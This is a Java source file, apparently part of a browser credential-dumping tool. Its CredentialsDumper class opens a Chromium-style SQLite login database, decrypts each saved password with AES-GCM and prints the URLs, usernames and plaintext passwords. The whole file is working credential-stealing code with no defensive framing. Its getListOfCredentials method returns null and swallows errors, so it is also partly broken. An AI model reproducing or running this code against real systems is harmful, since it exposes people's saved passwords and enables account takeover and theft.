package GUI.TableUtils.CrendentialsDumper;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.sql.*;
import java.util.Arrays;

import Information.Time;

import java.util.List;

public class CredentialsDumper {
    public String decrypt(byte[] encryptedPasswordBytes, byte[] secretKeyBytes) throws RuntimeException {
        Cipher cipher;
        byte[] iv = Arrays.copyOfRange(encryptedPasswordBytes, 3, 15);
        try {
            byte[] encryptedMessage = Arrays.copyOfRange(encryptedPasswordBytes, 15, encryptedPasswordBytes.length);
            cipher = Cipher.getInstance("AES/GCM/NoPadding");
            GCMParameterSpec spec = new GCMParameterSpec(128, iv);
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(secretKeyBytes, "AES"), spec);
            byte[] decryptedMessage = cipher.doFinal(encryptedMessage);
            return new String(decryptedMessage);
        } catch (NoSuchAlgorithmException | NoSuchPaddingException | BadPaddingException | IllegalBlockSizeException |
                 InvalidKeyException | InvalidAlgorithmParameterException e) {
            throw new RuntimeException(e);
        }
    }

    public List<Credentials> getListOfCredentials(byte[] secretKey, String dbPath) {
        java.sql.Connection connection = null;
        try {
            Class.forName("org.sqlite.JDBC");
            connection = DriverManager.getConnection("jdbc:sqlite:" + dbPath);
            Statement statement = connection.createStatement();

            ResultSet resultSet = statement.executeQuery("SELECT origin_url, action_url, username_value, " +
                    "password_value, date_created, date_last_used FROM logins ORDER BY date_last_used");

            while (resultSet.next()) {
                String originUrl = resultSet.getString("origin_url");
                String actionUrl = resultSet.getString("action_url");
                String usernameValue = resultSet.getString("username_value");
                byte[] passwordBytes = resultSet.getBytes("password_value");
                long dateCreated = resultSet.getLong("date_created");
                long dateLastUsed = resultSet.getLong("date_last_used");
                String decryptedPassword = decrypt(passwordBytes, secretKey);

                System.out.println("origin_url: " + originUrl);
                System.out.println("action_url: " + actionUrl);
                System.out.println("username_value: " + usernameValue);
                System.out.println("decrypted_password " + decryptedPassword);
                System.out.println("date_created: " + new Time().WebKitToDate(dateCreated));
                System.out.println("date_last_used: " + new Time().WebKitToDate(dateLastUsed));
            }

            resultSet.close();
            statement.close();
            connection.close();

        } catch (ClassNotFoundException | SQLException ignored) {

        } finally {
            try {
                if (connection != null) {
                    connection.close();
                }
            } catch (SQLException ignored) {

            }
        }
        return null;
    }
}
